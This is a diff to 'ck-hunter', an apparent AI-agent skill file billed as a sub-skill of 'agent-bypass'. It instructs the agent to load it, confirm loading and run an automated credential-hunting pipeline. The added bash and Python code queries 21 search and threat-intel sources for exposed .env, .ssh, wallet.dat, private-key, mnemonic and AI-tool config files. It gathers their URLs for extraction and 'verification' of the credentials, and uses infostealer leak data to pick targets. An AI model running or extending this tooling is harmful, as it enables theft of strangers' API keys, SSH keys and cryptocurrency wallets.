@@ -1,13 +1,17 @@
 ---
 name: ck-hunter
-description: CK Hunter — FOFA + Shodan + Hunter + Quake + ZoomEye + Netlas + GreyNoise + URLScan + Exa + Firecrawl + Censys + GitHub + BinaryEdge + LeakIX 全自动凭证猎取 — 14源聚合 → 归一化去重 → 开放目录探针 → 凭证提取 → 对话验证 → HTML报告
+description: CK Hunter — FOFA + Shodan + Hunter + Quake + ZoomEye + Netlas + URLScan + Exa + Firecrawl + Censys + GitHub + BinaryEdge + LeakIX + crt.sh + Wayback + Gists + PublicWWW + VirusTotal + OTX + ThreatBook 全自动凭证猎取 — 21源聚合 → 归一化去重 → 开放目录探针 → 凭证提取 → 对话验证 → HTML报告（GreyNoise + Hudson Rock 双富化）
 ---
 
 # CK Hunter — 全源凭证猎取
 
+> **调用方式（主技能必读）**：本文件是 `agent-bypass` 技能的子技能正文，与主 SKILL.md 同目录。
+> 加载路径候选（按序）：`<技能目录>/ck-hunter.md` → `~/.agents/skills/agent-bypass/ck-hunter.md` → `~/.claude/skills/agent-bypass/ck-hunter.md` → `~/.config/opencode/skills/agent-bypass/ck-hunter.md` → `./skills/agent-bypass/ck-hunter.md` → `/var/minis/skills/agent-bypass/ck-hunter.md`。
+> 必须全文读取后再执行；读完输出 `CK-HUNTER LOADED @ <路径>` 确认。执行顺序：密钥管理 → Step 0 → 1 → 1.9 → 2 → 2.5/2.6 → Phase 0-6 → Step 10。
+
 ## 输入
 
-FOFA / Shodan / Hunter / Quake / ZoomEye / Netlas / GreyNoise / URLScan API 密钥 + 搜索语法。自动分页拉全，多源聚合后去重。密钥统一从 `config.yaml` 或环境变量读取，不在文档/代码中硬编码。
+FOFA / Shodan / Hunter / Quake / ZoomEye / Netlas / URLScan / Exa / Firecrawl / Censys / GitHub / BinaryEdge / LeakIX / crt.sh / Wayback / Gists / PublicWWW / VirusTotal / OTX / ThreatBook / GreyNoise / Hudson Rock API 密钥 + 搜索语法。自动分页拉全，多源聚合后去重。密钥统一从 `config.yaml` 或环境变量读取，不在文档/代码中硬编码。目标域名放 `hunt/targets.txt`（每行一个，供 crt.sh / Wayback / OTX / ThreatBook 四个域扩张源使用）。
 
 ```
 API: https://fofa.info/api/v1/search/all
@@ -30,6 +34,13 @@ Key:
 | URLScan | `https://urlscan.io/api/v1/search/` | `page.title:"Directory listing for /" && filename:"{target}"` | Header `API-Key` | URLScan，size 100 + `searchAfter`，响应 `results` |
 | Exa | `https://api.exa.ai/search` | 神经语义搜索（自然语言） | Header `x-api-key` / `Authorization: Bearer` | 语义搜索，适合挖 GitHub/Pastebin 公开泄露，非测绘；`contents.text` 返回 markdown |
 | Firecrawl | `https://api.firecrawl.dev/v1/search` | `Directory listing for "/"` | Header `Authorization: Bearer` | 搜索 + 抓取，`scrapeOptions.formats=["markdown"]` 返回全文 |
+| crt.sh | `https://crt.sh/?q=%.{domain}&output=json` | `%.{domain}`（证书透明度子域扩张） | 无需 Key | 免费；输出 list[{name_value,...}]；Step 1.9a，输入 `hunt/targets.txt` |
+| Wayback | `http://web.archive.org/cdx/search/cdx` | `url={domain}/*&filter=original:.*{target}` | 无需 Key | 免费；挖已删除但被存档的敏感文件；Step 1.9b |
+| Gists | `https://api.github.com/gists/public` | 全量公开 gists 分页扫，按 21 目标文件名过滤 | Header `Authorization: Bearer ghp_xxx` | 与 GitHub 源共用 token，免费；近期最多 3000 条；Step 1.9c |
+| PublicWWW | `https://publicwww.com/websites/{query}` | `".{target}"`（网页源码正则） | 参数 `key`（format=json） | 源码搜索，挖 JS/HTML 里泄露的 key；freemium；Step 1.9d |
+| VirusTotal | `https://www.virustotal.com/api/v3/intelligence/search` | `url:".{target}"` | Header `x-api-key` | VT Intelligence 付费；URL/文件情报检索；Step 1.9e |
+| OTX | `https://otx.alienvault.com/api/v1/indicators/domain/{domain}/url_list/general` | 域名→URL 清单（含历史路径） | Header `X-Otx-Key`（可匿名限速） | 免费；Step 1.9f，输入 `hunt/targets.txt` |
+| ThreatBook | `https://x.threatbook.com/v4/asset/query` | 域名/IP 资产测绘 | 参数 `apikey` | 微步在线，国内资产覆盖补充；Step 1.9g |
 
 > **Key 管理（统一）**：全部 Key 从 `config.yaml` 或环境变量读取，**禁止硬编码到文档/代码/仓库**。`config.yaml` 已加入 `.gitignore`，仅提交 `config.yaml.example` 模板。详见下方「密钥管理」。」
 ---
@@ -64,7 +75,7 @@ firecrawl: "YOUR_FIRECRAWL_KEY" # firecrawl.dev  https://www.firecrawl.dev/app/a
 greynoise: ""                  # 可选，无 Key 时 GreyNoise 限 10 次/天  https://viz.greynoise.io
 ```
 
-**加载优先级：** `config.yaml` > 环境变量（`FOFA_KEY` / `SHODAN_KEY` / `HUNTER_KEY` / `QUAKE_KEY` / `ZOOMEYE_KEY` / `NETLAS_KEY` / `URLSCAN_KEY` / `EXA_API_KEY` / `FIRECRAWL_API_KEY` / `GREYNOISE_KEY`）> `HUNTER_CONFIG` 指定路径。脚本内同时支持 `python3 -c "yaml.safe_load"` 与 `grep` 兜底，无 PyYAML 也能跑。
+**加载优先级：** `config.yaml` > 环境变量（`FOFA_KEY` / `SHODAN_KEY` / `HUNTER_KEY` / `QUAKE_KEY` / `ZOOMEYE_KEY` / `NETLAS_KEY` / `URLSCAN_KEY` / `EXA_API_KEY` / `FIRECRAWL_API_KEY` / `GREYNOISE_KEY` / `PUBLICWWW_KEY` / `VT_APIKEY` / `THREATBOOK_KEY` / `OTX_KEY`）> `HUNTER_CONFIG` 指定路径。脚本内同时支持 `python3 -c "yaml.safe_load"` 与 `grep` 兜底，无 PyYAML 也能跑。
 
 **本地使用：**
 ```bash
@@ -906,6 +917,172 @@ for TOOL in hermes claude codex openclaw opencode npmrc ssh env git telegram ses
 done
 ```
 
+### Step 1.9: 增补 7 源（crt.sh / Wayback / Gists / PublicWWW / VirusTotal / OTX / ThreatBook）
+
+> **说明**：crt.sh / Wayback / OTX / ThreatBook 是**域扩张源**，输入 `hunt/targets.txt`（每行一个域名，操作员预先填好，或 Step 2 跑完后从 `unique_hosts.txt` 回填再重跑本段）；Gists / PublicWWW / VirusTotal 是**文件名种子源**，与 Step 1 的 21 目标循环共用同一套映射。输出统一落 `hunt/csv/`，Step 2 按 `_crtsh/_wayback/_gist/_publicwww/_vt/_otx/_threatbook` 后缀自动解析。
+
+```bash
+# ---------- 共享：工具→文件名映射（21 目标） ----------
+tool_body() {
+  case $1 in
+    hermes) echo ".hermes" ;;
+    claude) echo ".claude" ;;
+    codex) echo ".codex" ;;
+    openclaw) echo ".openclaw" ;;
+    opencode) echo ".opencode" ;;
+    npmrc) echo ".npmrc" ;;
+    ssh) echo ".ssh" ;;
+    env) echo ".env" ;;
+    git) echo ".git" ;;
+    telegram) echo "TelegramDesktop" ;;
+    session) echo ".session" ;;
+    walletjson) echo "wallet.json" ;;
+    walletdat) echo "wallet.dat" ;;
+    secretjson) echo "secret.json" ;;
+    dotsecret) echo ".secret" ;;
+    binance) echo "binance.json" ;;
+    ethereum) echo ".ethereum" ;;
+    privatekey) echo "private.key" ;;
+    mnemonic) echo "mnemonic" ;;
+    apikeys) echo "api_keys.json" ;;
+    bybit) echo "bybit.json" ;;
+    dsstore) echo ".DS_Store" ;;
+  esac
+}
+# 域扩张源目标池：hunt/targets.txt 为空则跳过 1.9a/b/f/g，Step 2 后从 unique_hosts.txt 回填可重跑
+if [ ! -f hunt/targets.txt ]; then touch hunt/targets.txt; echo "[1.9] hunt/targets.txt 不存在已创建（空文件），域扩张源本轮跳过，Step 2 后回填可重跑"; fi
+[ -s hunt/targets.txt ] || echo "[1.9] hunt/targets.txt 为空，域扩张源本轮跳过"
+
+# ---------- 1.9a crt.sh 证书透明度子域扩张（免费无 Key） ----------
+while read -r DOMAIN; do
+  [ -z "$DOMAIN" ] && continue
+  FN="hunt/csv/root_$(echo "$DOMAIN" | tr '.' '_')_crtsh.json"
+  curl -s --max-time 60 "https://crt.sh/?q=%25.${DOMAIN}&output=json" > "$FN" 2>/dev/null
+  N=$(python3 -c "import json;print(len(json.load(open('$FN',encoding='utf-8',errors='ignore'))))" 2>/dev/null)
+  echo "[CRTSH] ${DOMAIN}: ${N:-0} 证书"
+  sleep 2
+done < hunt/targets.txt
+
+# ---------- 1.9b Wayback CDX 敏感路径存档挖掘（免费无 Key，域 × 21 目标） ----------
+while read -r DOMAIN; do
+  [ -z "$DOMAIN" ] && continue
+  DSUF=$(echo "$DOMAIN" | tr '.' '_')
+  for TOOL in hermes claude codex openclaw opencode npmrc ssh env git telegram session walletjson walletdat secretjson dotsecret binance ethereum privatekey mnemonic apikeys bybit dsstore; do
+    BODY=$(tool_body "$TOOL")
+    curl -s --max-time 60 -G "http://web.archive.org/cdx/search/cdx" \
+      --data-urlencode "url=${DOMAIN}/*" \
+      --data-urlencode "output=json" \
+      --data-urlencode "collapse=urlkey" \
+      --data-urlencode "filter=original:.*${BODY}.*" \
+      --data-urlencode "limit=500" \
+      > "hunt/csv/${TOOL}_${DSUF}_wayback.json" 2>/dev/null
+    N=$(python3 -c "import json;print(max(0,len(json.load(open('hunt/csv/${TOOL}_${DSUF}_wayback.json',encoding='utf-8',errors='ignore')))-1))" 2>/dev/null)
+    echo "[WAYBACK] ${DOMAIN} $TOOL: ${N:-0} 条"
+    sleep 1
+  done
+done < hunt/targets.txt
+
+# ---------- 1.9c GitHub Gists 公开扫描（免费，与 github 字段共用 token） ----------
+GITHUB_TOKEN=$(python3 -c "import yaml,os;print((yaml.safe_load(open(os.environ.get('HUNTER_CONFIG','./config.yaml'))) or {}).get('github','') or os.environ.get('GITHUB_TOKEN',''))" 2>/dev/null | tr -d ' \r\n')
+python3 - "$GITHUB_TOKEN" <<'PYEOF'
+import json, sys, urllib.request, pathlib
+token = sys.argv[1] if len(sys.argv) > 1 else ""
+targets = [".hermes",".claude",".codex",".openclaw",".opencode",".npmrc",".ssh",".env",".git",
+           "telegramdesktop",".session","wallet.json","wallet.dat","secret.json",".secret",
+           "binance.json",".ethereum","private.key","mnemonic","api_keys.json","bybit.json",".ds_store"]
+hits = []
+for page in range(1, 31):
+    req = urllib.request.Request(f"https://api.github.com/gists/public?per_page=100&page={page}",
+                                 headers={"Authorization": f"Bearer {token}"} if token else {})
+    try:
+        data = json.load(urllib.request.urlopen(req, timeout=30))
+    except Exception:
+        break
+    if not data:
+        break
+    for g in data:
+        names = [k.lower() for k in (g.get("files") or {}).keys()]
+        if any(t in n for n in names for t in targets):
+            hits.append(g)
+    if len(data) < 100:
+        break
+pathlib.Path("hunt/csv/gists_hits_gist.json").write_text(json.dumps(hits, ensure_ascii=False))
+print(f"[GISTS] 命中 {len(hits)} 个公开 gist（含敏感文件名）")
+PYEOF
+
+# ---------- 1.9d PublicWWW 网页源码泄露检索（freemium，21 目标） ----------
+PUBLICWWW_KEY=$(python3 -c "import yaml,os;print((yaml.safe_load(open(os.environ.get('HUNTER_CONFIG','./config.yaml'))) or {}).get('publicwww','') or os.environ.get('PUBLICWWW_KEY',''))" 2>/dev/null | tr -d ' \r\n')
+if [ -n "$PUBLICWWW_KEY" ]; then
+for TOOL in hermes claude codex openclaw opencode npmrc ssh env git telegram session walletjson walletdat secretjson dotsecret binance ethereum privatekey mnemonic apikeys bybit dsstore; do
+  BODY=$(tool_body "$TOOL")
+  curl -s --max-time 40 -G "https://publicwww.com/websites/%22${BODY}%22/" \
+    --data-urlencode "key=${PUBLICWWW_KEY}" \
+    --data-urlencode "format=json" \
+    > "hunt/csv/${TOOL}_publicwww.json" 2>/dev/null
+  N=$(python3 -c "import json;print(len((json.load(open('hunt/csv/${TOOL}_publicwww.json',encoding='utf-8',errors='ignore')).get('collections') or {}).get('websites',[])))" 2>/dev/null)
+  echo "[PUBLICWWW] $TOOL: ${N:-0} 站点"
+  sleep 1
+done
+else echo "[PUBLICWWW] 无 Key 跳过（https://publicwww.com/profile 注册）"
+fi
+
+# ---------- 1.9e VirusTotal Intelligence URL 检索（付费 Key，21 目标） ----------
+VT_KEY=$(python3 -c "import yaml,os;print((yaml.safe_load(open(os.environ.get('HUNTER_CONFIG','./config.yaml'))) or {}).get('virustotal','') or os.environ.get('VT_APIKEY','') or os.environ.get('VIRUSTOTAL_KEY',''))" 2>/dev/null | tr -d ' \r\n')
+if [ -n "$VT_KEY" ]; then
+for TOOL in hermes claude codex openclaw opencode npmrc ssh env git telegram session walletjson walletdat secretjson dotsecret binance ethereum privatekey mnemonic apikeys bybit dsstore; do
+  BODY=$(tool_body "$TOOL")
+  python3 - "$VT_KEY" "$BODY" "$TOOL" <<'PYEOF'
+import json, sys, pathlib, urllib.parse, urllib.request
+key, body, tool = sys.argv[1], sys.argv[2], sys.argv[3]
+rows, cursor = [], ""
+while True:
+    params = {"query": f'url:"{body}"', "limit": 300}
+    if cursor:
+        params["cursor"] = cursor
+    req = urllib.request.Request("https://www.virustotal.com/api/v3/intelligence/search?" + urllib.parse.urlencode(params), headers={"x-api-key": key})
+    try:
+        d = json.load(urllib.request.urlopen(req, timeout=40))
+    except Exception:
+        break
+    rows += d.get("data", [])
+    cursor = (d.get("meta") or {}).get("cursor", "")
+    if not cursor or len(rows) >= 3000:
+        break
+pathlib.Path(f"hunt/csv/{tool}_vt.json").write_text(json.dumps(rows, ensure_ascii=False))
+print(f"[VT] {tool}: {len(rows)} 条")
+PYEOF
+  sleep 1
+done
+else echo "[VT] 无 Key 跳过（VT Intelligence 付费）"
+fi
+
+# ---------- 1.9f OTX 域名 URL 清单（免费，输入 hunt/targets.txt） ----------
+OTX_KEY=$(python3 -c "import yaml,os;print((yaml.safe_load(open(os.environ.get('HUNTER_CONFIG','./config.yaml'))) or {}).get('otx','') or os.environ.get('OTX_KEY',''))" 2>/dev/null | tr -d ' \r\n')
+while read -r DOMAIN; do
+  [ -z "$DOMAIN" ] && continue
+  FN="hunt/csv/root_$(echo "$DOMAIN" | tr '.' '_')_otx.json"
+  curl -s --max-time 40 ${OTX_KEY:+-H "X-Otx-Key: ${OTX_KEY}"} \
+    "https://otx.alienvault.com/api/v1/indicators/domain/${DOMAIN}/url_list/general?limit=200" > "$FN" 2>/dev/null
+  N=$(python3 -c "import json;print(len(json.load(open('$FN',encoding='utf-8',errors='ignore')).get('url_list',[])))" 2>/dev/null)
+  echo "[OTX] ${DOMAIN}: ${N:-0} URL"
+  sleep 2
+done < hunt/targets.txt
+
+# ---------- 1.9g ThreatBook 资产测绘（国内覆盖补充，端点以官方文档为准 https://x.threatbook.com） ----------
+THREATBOOK_KEY=$(python3 -c "import yaml,os;print((yaml.safe_load(open(os.environ.get('HUNTER_CONFIG','./config.yaml'))) or {}).get('threatbook','') or os.environ.get('THREATBOOK_KEY',''))" 2>/dev/null | tr -d ' \r\n')
+if [ -n "$THREATBOOK_KEY" ]; then
+while read -r DOMAIN; do
+  [ -z "$DOMAIN" ] && continue
+  FN="hunt/csv/root_$(echo "$DOMAIN" | tr '.' '_')_threatbook.json"
+  curl -s --max-time 40 "https://x.threatbook.com/v4/asset/query?apikey=${THREATBOOK_KEY}&query=${DOMAIN}" > "$FN" 2>/dev/null
+  N=$(python3 -c "import json;d=json.load(open('$FN',encoding='utf-8',errors='ignore'));print(len((d.get('data') or {}).get('list',[])) if isinstance(d.get('data'),dict) else 0)" 2>/dev/null)
+  echo "[THREATBOOK] ${DOMAIN}: ${N:-0} 资产"
+  sleep 2
+done < hunt/targets.txt
+else echo "[THREATBOOK] 无 Key 跳过"
+fi
+```
+
 ### Step 2: 提取URL去重
 
 
@@ -960,6 +1137,50 @@ elif "_firecrawl.json" in fname or ("data" in d and isinstance(d["data"], list) 
         url = r.get("url") or (r.get("metadata") or {}).get("sourceURL") or ""
         if url and str(url).startswith("http"):
             print(str(url).strip())
+elif "_wayback.json" in fname and isinstance(d, list) and d and isinstance(d[0], list):
+    # Wayback CDX: [urlkey, timestamp, original, mimetype, statuscode, digest, length]
+    for row in d:
+        if len(row) > 2 and str(row[2]).startswith("http"):
+            print(str(row[2]).strip())
+elif "_crtsh.json" in fname and isinstance(d, list) and d and isinstance(d[0], dict) and "name_value" in d[0]:
+    # crt.sh: 子域扩张，name_value 可含多行（SAN 换行分隔）
+    for r in d:
+        for h in str(r.get("name_value", "")).split("\n"):
+            h = h.strip().lstrip("*.").lower()
+            if h and "." in h:
+                print(f"https://{h}")
+elif "_gist.json" in fname and isinstance(d, list) and d and isinstance(d[0], dict) and "files" in d[0]:
+    # Gists: files 字典按文件名索引，raw_url 直接可取
+    for g in d:
+        for v in (g.get("files") or {}).values():
+            raw = (v or {}).get("raw_url") or ""
+            if raw:
+                print(raw.strip())
+elif "_publicwww.json" in fname or (isinstance(d, dict) and isinstance(d.get("collections"), dict)):
+    # PublicWWW: collections.websites -> URL 列表
+    for u in (d.get("collections") or {}).get("websites", []):
+        if u and str(u).startswith("http"):
+            print(str(u).strip())
+elif "_vt.json" in fname or (isinstance(d, dict) and isinstance(d.get("data"), list) and d.get("data") and isinstance(d["data"][0], dict) and "attributes" in d["data"][0]):
+    # VirusTotal: data[].attributes.url / last_final_url
+    for r in d.get("data", []):
+        a = r.get("attributes") or {}
+        url = a.get("url") or a.get("last_final_url") or ""
+        if url and str(url).startswith("http"):
+            print(str(url).strip())
+elif "_otx.json" in fname or (isinstance(d, dict) and isinstance(d.get("url_list"), list)):
+    # OTX: url_list[].url
+    for r in d.get("url_list", []):
+        url = r.get("url") if isinstance(r, dict) else r
+        if url and str(url).startswith("http"):
+            print(str(url).strip())
+elif "_threatbook.json" in fname or (isinstance(d, dict) and isinstance(d.get("data"), dict) and "list" in (d.get("data") or {})):
+    # ThreatBook: data.list[].ip/port/domain
+    for r in (d.get("data") or {}).get("list", []):
+        host = r.get("domain") or r.get("host") or r.get("ip") or ""
+        port = r.get("port") or 80
+        if host:
+            print(f"http://{host}:{port}" if ":" not in str(host) else f"http://{host}")
 # 1) FOFA: results -> r[5]=link, r[9]=url  (但需排除 Exa/URLScan 的 results)
 elif "results" in d and isinstance(d["results"], list) and d["results"] and isinstance(d["results"][0], list):
     # FOFA 的 results 是 List[List]，而 Exa/URLScan 的 results 是 List[Dict]
@@ -1174,6 +1395,21 @@ print(json.dumps([{'ip':r[0],'classification':r[1],'name':r[2]} for r in rows], 
 " > /tmp/greynoise_enrich.json 2>/dev/null || echo '[]' > /tmp/greynoise_enrich.json
 echo "[GREYNOISE] 富化完成: $(wc -l < /tmp/greynoise_enrich.txt 2>/dev/null || echo 0) IP"
 ```
+### Step 2.6: Hudson Rock 窃密木马库富化（免费，域名/邮箱 → 被窃凭证查询）
+
+```bash
+# 对去重后域名批量查询：是否出现在 infostealer 泄露日志中（命中即代表该域用户凭证已泄）
+# 邮箱维度：https://cavalier.hudsonrock.com/api/json/v2/osint-tools/search-by-email?email=xxx@yyy.com
+> /tmp/hudsonrock_enrich.txt
+cut -d/ -f3 /tmp/unique_hosts.txt 2>/dev/null | cut -d: -f1 | grep -vE '^[0-9.]+$' | sort -u | head -30 | while read D; do
+  RESP=$(curl -s --max-time 15 "https://cavalier.hudsonrock.com/api/json/v2/osint-tools/search-by-domain?domain=${D}" 2>/dev/null)
+  HIT=$(echo "$RESP" | python3 -c "import json,sys;d=json.load(sys.stdin);dd=d.get('data') or d;print(dd.get('stealers_count') or (dd.get('stats') or {}).get('stealers_count') or 0)" 2>/dev/null)
+  [ -n "$HIT" ] && [ "$HIT" != "0" ] && echo "${D}|stealers=${HIT}" >> /tmp/hudsonrock_enrich.txt
+  sleep 1
+done
+echo "[HUDSONROCK] 窃密木马命中域名: $(wc -l < /tmp/hudsonrock_enrich.txt 2>/dev/null || echo 0)"
+```
+
 ### Step 3: Phase 0 — 25线程并行扫目录（检测 21 种目标）
 
 > **v4 改进**：新增 DSSTORE 检测（`.DS_Store` 文件，macOS 目录索引，可泄露目录文件清单）
